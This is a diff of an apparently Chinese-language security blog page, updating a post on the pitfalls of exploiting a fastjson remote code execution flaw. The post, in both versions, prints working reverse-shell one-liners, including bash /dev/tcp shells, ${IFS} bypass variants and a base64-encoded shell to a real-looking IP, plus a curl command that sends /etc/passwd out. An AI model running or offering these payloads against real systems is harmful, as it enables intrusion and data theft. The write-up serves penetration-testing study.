@@ -14,7 +14,7 @@
 <meta property="og:url" content="http://yoursite.com/2020/05/25/fastjson-rce利用踩坑/index.html">
 <meta property="og:site_name" content="Halfblue">
 <meta property="og:description" content="用burp插件扫到个fastjson，找了个工具测试curl，很快收到了请求，感觉很简单想执行别的命令看看，结果一个周末就搭上面了">
-<meta property="og:updated_time" content="2020-05-25T09:09:56.290Z">
+<meta property="og:updated_time" content="2020-06-11T03:08:27.354Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="fastjson rce利用踩坑">
 <meta name="twitter:description" content="用burp插件扫到个fastjson，找了个工具测试curl，很快收到了请求，感觉很简单想执行别的命令看看，结果一个周末就搭上面了">
@@ -168,9 +168,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>用burp插件扫到个fastjson，找了个工具测试curl，很快收到了请求，感觉很简单想执行别的命令看看，结果一个周末就搭上面了<a id="more"></a><br>用的工具是群里少宇推荐的fastjson_rce_tool，很好用，唯一的问题是只能执行一条命令，不能定制java脚本。嫌麻烦我懒得自己启jndi服务什么的，就想用这个工具直接弹shell。结果试了各种弹shell的方法都失败了，很迷惑。<br>然后考虑curl带外，这里一个很坑的地方是如果直接在参数写”curl ip/<code>whoami</code>“这种的话，反引号的内容实际上是在本机解析的，也就是查看的是自己的whoami，当时用ifconfig看到自己的ip时候才明白过来。那就只能用curl读读文件curl -F file=@/etc/passwd ip这样。<br>要执行命令就要用到管道，本来想base64的，但是好像目标没有base64。最后的解决办法是’echo “curl ip/<code>pwd</code>“ | /bin/bash’终于成功执行了命令。但很奇怪的是直接curl的时候源ip和用bash执行时候的源ip不一样，后一台还会隔几分钟，不太清楚负载什么怎么做的。<br>看了下pwd是/root/bash_sandbox_samples/随机字符，这样的一个目录，那应该是一个删减的shell，功能比较少。还是不知道怎么处理多行返回值。<br>最后在CaijiOrz的工具找到了一个神奇的命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/bash -c <span class="variable">$@</span>|bash 0 <span class="built_in">echo</span> bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1</div></pre></td></tr></table></figure></p>
-<p>弹出来了，给力<br>看来是java的执行shell方式有些独特。。。看了下服务器上base64之类的命令都有，不懂为什么失败。<br>还找到个以前记录过的，也可以<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjQ3Ljc2LjUxLzg4ODggMD4mMQ==&#125;|&#123;base64,<span class="_">-d</span>&#125;|&#123;bash,-i&#125;</div></pre></td></tr></table></figure></p>
-<p>感觉自己好像瞎，明明之前有个ctf的反序列化题里看wp复制下来的。。。看来别人帮踩了坑也没有用，自己还是会掉里面。<br>原理在<a href="https://b1ngz.github.io/java-os-command-injection-note/" target="_blank" rel="external">https://b1ngz.github.io/java-os-command-injection-note/</a></p>
-<p>参考链接<br><a href="https://github.com/wyzxxz/fastjson_rce_tool" target="_blank" rel="external">https://github.com/wyzxxz/fastjson_rce_tool</a><br><a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="external">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
+<p>弹出来了，给力<br>还有<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/bin/bash -c bash<span class="variable">$&#123;IFS&#125;</span>-i<span class="variable">$&#123;IFS&#125;</span>&gt;&amp;/dev/tcp/127.0.0.1/8888&lt;&amp;1</div><div class="line">/bin/bash -c $*|bash 0 <span class="built_in">echo</span> bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1</div></pre></td></tr></table></figure></p>
+<p>来自<a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="external">https://blog.spoock.com/2018/11/25/getshell-bypass-exec/</a><br>还找到个以前记录过的，也可以<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjQ3Ljc2LjUxLzg4ODggMD4mMQ==&#125;|&#123;base64,<span class="_">-d</span>&#125;|&#123;bash,-i&#125;</div></pre></td></tr></table></figure></p>
+<p>感觉自己好像瞎，明明之前有个ctf的反序列化题里看wp复制下来的。。。看来别人帮踩了坑也没有用，自己还是会掉里面。<br>看来是java的执行shell方式有些独特，分割会有问题。原理<br><a href="https://b1ngz.github.io/java-os-command-injection-note/" target="_blank" rel="external">https://b1ngz.github.io/java-os-command-injection-note/</a><br><a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_blank" rel="external">http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a><br>参考链接<br><a href="https://github.com/wyzxxz/fastjson_rce_tool" target="_blank" rel="external">https://github.com/wyzxxz/fastjson_rce_tool</a><br><a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="external">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a><br><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="external">https://blog.spoock.com/2018/11/25/getshell-bypass-exec/</a></p>
 
       
 
@@ -373,11 +373,11 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="color3">渗透</a>
+                <a href="javascript:void(0)" class="color4">CTF</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="color4">CTF</a>
+                <a href="javascript:void(0)" class="color3">渗透</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -386,6 +386,10 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="color5">机器学习</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="color3">挖洞</a>
               </li>
             
             <div class="clearfix"></div>
